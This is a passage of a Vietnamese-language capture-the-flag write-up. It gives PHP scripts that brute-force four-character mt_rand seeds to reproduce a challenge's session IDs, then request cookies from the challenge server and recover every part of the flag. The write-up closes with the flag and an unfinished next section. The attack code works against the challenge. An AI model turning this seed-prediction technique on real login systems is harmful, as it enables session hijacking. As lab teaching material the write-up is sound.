    for($i=0;$i<1000;$i++) {
        $id .= ALPHA[mt_rand(0,count(ALPHA)-1)];
    }
    return $id;
}

function bruteforce($username, $password){
    $chr = str_split("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{_-}");
    $s = $username . $password;
    foreach ($chr as $i) {
        foreach ($chr as $j) {
            foreach ($chr as $k) {
                foreach ($chr as $l) {
                    $tmp = session_id_gen($s, $i.$j.$k.$l);
                    $s_hash = session_id_secure($s);
                    
                    if ($s_hash == $tmp){
                        echo "Found : " . $i.$j.$k.$l . "\n";
                        return 0;
                    }
                    
                }
            }
        }
    }
}

bruteforce("z", "h");

?>
```

Sau khi bruteforce thì ta tìm được chuỗi Miku mà mình đặt vào trong flag.

![image](https://hackmd.io/_uploads/SJMir4kF1g.png)

Ok bây giờ kết hợp tất cả lại và bruteforce thôi nhưng giờ là brute nhiều part hơn nên khá là lâu.

```php
<?php

function get_user_pass(){
    $chr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    $chr = str_split($chr);
    $arr = [];
    foreach ($chr as $i) {
        foreach ($chr as $j) {
            $s = $i . $j;
            if (is_numeric(md5($s)[0])){
                $arr[md5($s)[0]] = [$i, $j];
            }
        }
    }
    return $arr;
}


function get_session($username, $password){
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_URL, 'http://52.59.124.14:5008/');
    curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.$username.'&password='.$password);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch,  CURLOPT_HEADER,  1); 
    
    $result = curl_exec($ch);
    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', 
              $result,  $match_found); 
    $cookies = array(); 
    foreach($match_found[1] as $item) { 
        parse_str($item,  $cookie); 
        $cookies = array_merge($cookies,  $cookie); 
    } 
    curl_close($ch); 
    return $cookies["PHPSESSID"];
}



define("ALPHA", str_split("abcdefghijklmnopqrstuvwxyz0123456789_-"));

function session_id_gen($id, $seed) {
    mt_srand(intval(bin2hex($seed),16));
    $id = "";
    for($i=0;$i<1000;$i++) {
        $id .= ALPHA[mt_rand(0,count(ALPHA)-1)];
    }
    return $id;
}


function bruteforce($username, $password, $index){
    $chr = str_split("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{_-}");
    $s_hash = get_session($username, $password);
    $s = $username . $password;
    foreach ($chr as $i) {
        foreach ($chr as $j) {
            foreach ($chr as $k) {
                foreach ($chr as $l) {
                    $tmp = session_id_gen($s, $i.$j.$k.$l);
                    
                    if ($s_hash == $tmp){
                        echo "Part " . $index + 1 . " : " . $i.$j.$k.$l . "\n";
                        return 0;
                    }
                    
                }
            }
        }
    }
}

function solve(){
    $arr = get_user_pass();
    for ($i=0; $i < count($arr); $i++) { 
        $username = $arr[strval($i)][0];
        $password = $arr[strval($i)][1];
        bruteforce($username, $password, $i);
    }
}

solve();

?>
```

Brute tầm 3 tiếng thì mình có tất cả các part của flag

![image](https://hackmd.io/_uploads/S10NGNyFyx.png)

Flag : ENO{SOME_SUPER_SECURE_FLAG_1333337_HACK}

## Zoney

Updating...